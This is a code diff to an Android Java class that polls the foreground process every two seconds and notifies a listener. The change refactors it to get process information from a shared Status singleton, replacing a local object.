@@ -10,6 +10,7 @@
 package com.android.deviceinfo.listener;
 
 import com.android.deviceinfo.RunningProcesses;
+import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
 
@@ -22,14 +23,14 @@ public class BroadcastMonitorProcess extends Thread {
 	private final int period;
 	String oldForeDigest = "";
 
-	RunningProcesses runningProcess;
+	
 
 	private ListenerProcess listenerProcess;
 
 	public BroadcastMonitorProcess() {
 		stop = false;
 		period = 2000; // Poll interval
-		runningProcess = new RunningProcesses();
+		
 		
 		if (Cfg.DEBUG) {
 			setName(getClass().getSimpleName());
@@ -40,7 +41,7 @@ public class BroadcastMonitorProcess extends Thread {
 	public void run() {
 		while (!stop) {
 			
-			String foreDigest = runningProcess.getForeground();
+			String foreDigest = Status.self().getForeground();
 
 			if (!foreDigest.equals(oldForeDigest)) {
 				if (Cfg.DEBUG) {
@@ -48,7 +49,7 @@ public class BroadcastMonitorProcess extends Thread {
 				}
 				oldForeDigest = foreDigest;
 
-				listenerProcess.dispatch(runningProcess);
+				listenerProcess.dispatch(Status.self().getRunningProcess());
 			}
 
 			try {
